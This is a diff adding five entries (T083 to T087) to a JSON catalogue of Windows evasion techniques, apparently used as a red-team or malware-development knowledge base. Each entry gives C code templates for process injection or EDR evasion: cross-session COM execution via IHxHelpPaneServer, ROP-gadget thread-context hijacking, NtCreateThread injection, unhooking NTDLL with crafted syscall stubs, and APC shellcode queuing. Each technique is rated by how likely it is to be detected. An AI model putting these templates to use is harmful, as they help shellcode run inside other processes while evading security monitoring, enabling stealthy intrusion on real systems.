@@ -1,6 +1,6 @@
 {
   "version": "1.1",
-  "last_updated": "2026-03-06T15:00:00.000000",
+  "last_updated": "2026-03-06T12:26:50.290217",
   "techniques": [
     {
       "id": "T001",
@@ -1545,6 +1545,123 @@
       "references": [
         "https://github.com/thisarasewmina/DbgNexum"
       ]
+    },
+    {
+      "name": "IHxHelpPaneServer COM Execution",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Cross-session COM object execution via IHxHelpPaneServer interface (CLSID: 8cec58ae-07a1-11d9-b15e-000d56bfe6ee) for arbitrary code execution. Uses IStandardActivator with ISpecialSystemProperties to set target session ID, then calls IHxHelpPaneServer::Execute with file:// URL to launch executables in other sessions without traditional process injection.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "code_template": "// Cross-session COM execution via IHxHelpPaneServer\\nGUID CLSID_IHxHelpPaneServer = { 0x8cec58ae, 0x07a1, 0x11d9, { 0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee } };\\nGUID IID_IHxHelpPaneServer = { 0x8cec592c, 0x07a1, 0x11d9, { 0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee } };\\nGUID CLSID_ComActivator = { 0x0000033C, 0x0000, 0x0000, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };\\n\\nIStandardActivator* pComAct;\\nCoCreateInstance(CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (void**)&pComAct);\\n\\nISpecialSystemProperties* pSpecialProperties;\\npComAct->QueryInterface(IID_ISpecialSystemProperties, (void**)&pSpecialProperties);\\npSpecialProperties->SetSessionId(targetSession, 0, 1);\\n\\nMULTI_QI qis[1];\\nqis[0].pIID = &IID_IHxHelpPaneServer;\\npComAct->StandardCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, NULL, 1, qis);\\n\\nIHxHelpPaneServer* pIHxHelpPaneServer = static_cast<IHxHelpPaneServer*>(qis[0].pItf);\\npIHxHelpPaneServer->Execute(L\"file:///C:/Windows/System32/calc.exe\");",
+      "apis": [
+        "CoCreateInstance",
+        "IStandardActivator",
+        "ISpecialSystemProperties",
+        "IHxHelpPaneServer"
+      ],
+      "references": [
+        "https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d",
+        "https://github.com/CICADA8-Research/IHxExec"
+      ],
+      "id": "T083",
+      "created_at": "2026-03-06T12:25:44.902036",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Thread Context ROP Gadget Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Process injection using SetThreadContext with push-push-ret ROP gadgets to redirect execution without CreateRemoteThread. Searches target process memory for unique PUSH REG1; PUSH REG2; RET gadgets, then uses SetThreadContext to set registers and RIP to execute arbitrary functions (VirtualAlloc, RtlFillMemory) before returning to shellcode. Avoids classic injection indicators.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "SetThreadContext",
+        "GetThreadContext",
+        "VirtualAllocEx",
+        "ReadProcessMemory",
+        "VirtualQueryEx"
+      ],
+      "code_template": "// Find push-push-ret gadget in target process\nGadgetInfo gadget = FindUniquePushPushRetGadget(hProcess);\n// gadget.regId1 will hold ExitThread address, gadget.regId2 will hold function address\n\n// Set context to call VirtualAlloc\nCONTEXT ctx = {0};\nctx.ContextFlags = CONTEXT_FULL;\nctx.Rip = (DWORD64)gadget.address;  // Point to push-push-ret gadget\nSetRegisterContextValue(ctx, gadget.regId1, exitThreadAddr);\nSetRegisterContextValue(ctx, gadget.regId2, virtualAllocAddr);\nctx.Rcx = 0;  // lpAddress\nctx.Rdx = allocSize;  // dwSize\nctx.R8 = MEM_COMMIT | MEM_RESERVE;  // flAllocationType\nctx.R9 = PAGE_EXECUTE_READWRITE;  // flProtect\nSetThreadContext(hThread, &ctx);",
+      "references": [
+        "https://github.com/Friends-Security/RedirectThread",
+        "https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/"
+      ],
+      "source": "Friends-Security/RedirectThread",
+      "created_at": "2026-03-06T12:26:50.290217",
+      "id": "T084",
+      "category": "evasion"
+    },
+    {
+      "name": "NtCreateThread ROP Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Shellcode injection via NtCreateThread with custom stack allocation and ROP gadget execution. Allocates stack in target process, initializes INITIAL_TEB and CONTEXT structures, sets RIP to ROP gadget address. Uses NtCreateThread native API instead of CreateRemoteThread for lower detection surface. Combines with push-push-ret gadget to call arbitrary functions.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "NtCreateThread",
+        "VirtualAllocEx",
+        "GetThreadContext",
+        "SetThreadContext"
+      ],
+      "code_template": "// Allocate custom stack in target process\nPVOID stackBase, stackLimit;\nAllocateRemoteStack(hProcess, stackSize, &stackBase, &stackLimit);\n\n// Initialize TEB and context\nINITIAL_TEB initialTeb = {0};\ninitialTeb.StackBase = stackBase;\ninitialTeb.StackLimit = stackLimit;\n\nCONTEXT threadContext = {0};\nthreadContext.ContextFlags = CONTEXT_FULL;\nthreadContext.Rip = (DWORD64)gadget.address;\nthreadContext.Rsp = (DWORD64)stackBase;\n\n// Call NtCreateThread\nNtCreateThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &clientId, &threadContext, &initialTeb, FALSE);",
+      "references": [
+        "https://github.com/Friends-Security/RedirectThread",
+        "https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/"
+      ],
+      "source": "Friends-Security/RedirectThread",
+      "created_at": "2026-03-06T12:26:50.290217",
+      "id": "T085",
+      "category": "evasion"
+    },
+    {
+      "name": "CraftUnhook Syscall Stub Crafting",
+      "type": "unhooking",
+      "evasion_type": "unhooking",
+      "description": "Unhook NTDLL functions by crafting clean syscall stubs without reading from disk. Parses NTDLL exception directory (RUNTIME_FUNCTION table) to resolve system call numbers (SSN) by analyzing function order. Constructs fresh syscall stub template with proper WoW64 transition support. Overwrites hooked functions with clean stubs, then restores original bytes after call.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "VirtualProtect",
+        "RtlPcToFileHeader",
+        "RtlLookupFunctionEntry"
+      ],
+      "code_template": "// Craft syscall stub without disk read\nstatic BYTE stubTemplate[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xF6, 0x04, 0x25, 0x08, 0x00, 0xFE, 0x7F, 0x01, 0x75, 0x03, 0x0F, 0x05, 0xC3, 0xCD, 0x2E };\n\n// Resolve SSN from exception directory\nDWORD ssn = getFnSsnFromName(hash::ror13(\"ZwQueryInformationProcess\"));\nmemcpy(&stubTemplate[4], &ssn, sizeof(ssn));\n\n// Overwrite hooked function\nVirtualProtect(procAddress, stubSize, PAGE_EXECUTE_READWRITE, &oldProtection);\nmemcpy(procAddress, stubTemplate, stubSize);\nVirtualProtect(procAddress, stubSize, oldProtection, &oldProtection);",
+      "references": [
+        "https://github.com/internetangel/CraftUnhook",
+        "https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/"
+      ],
+      "source": "internetangel/CraftUnhook",
+      "created_at": "2026-03-06T12:26:50.290217",
+      "id": "T086",
+      "category": "evasion"
+    },
+    {
+      "name": "APC Queue Context Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Asynchronous Procedure Call injection using QueueUserAPC, QueueUserAPC2, NtQueueApcThread, NtQueueApcThreadEx, and NtQueueApcThreadEx2 with thread context manipulation. Targets alertable threads to queue shellcode execution without CreateRemoteThread. Can use special user APC flags (QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC) for more reliable execution.",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "QueueUserAPC",
+        "QueueUserAPC2",
+        "NtQueueApcThread",
+        "NtQueueApcThreadEx",
+        "NtQueueApcThreadEx2",
+        "OpenThread"
+      ],
+      "code_template": "// QueueUserAPC2 with special user APC flag\ntypedef DWORD (WINAPI *pQueueUserAPC2)(PAPC_FUNC ApcRoutine, HANDLE ThreadHandle, ULONG_PTR Data, ULONG Flags);\n\n#define QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC 0x00000001\n\npQueueUserAPC2 QueueUserAPC2 = (pQueueUserAPC2)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"QueueUserAPC2\");\nQueueUserAPC2((PAPC_FUNC)shellcodeAddr, hThread, 0, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC);\n\n// NtQueueApcThreadEx2 for native API approach\ntypedef NTSTATUS (NTAPI *pNtQueueApcThreadEx2)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2, ULONG Flags);\npNtQueueApcThreadEx2 NtQueueApcThreadEx2 = (pNtQueueApcThreadEx2)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueueApcThreadEx2\");\nNtQueueApcThreadEx2(hThread, shellcodeAddr, NULL, NULL, NULL, 1);",
+      "references": [
+        "https://github.com/Friends-Security/RedirectThread",
+        "https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/"
+      ],
+      "source": "Friends-Security/RedirectThread",
+      "created_at": "2026-03-06T12:26:50.290217",
+      "id": "T087",
+      "category": "evasion"
     }
   ]
 }
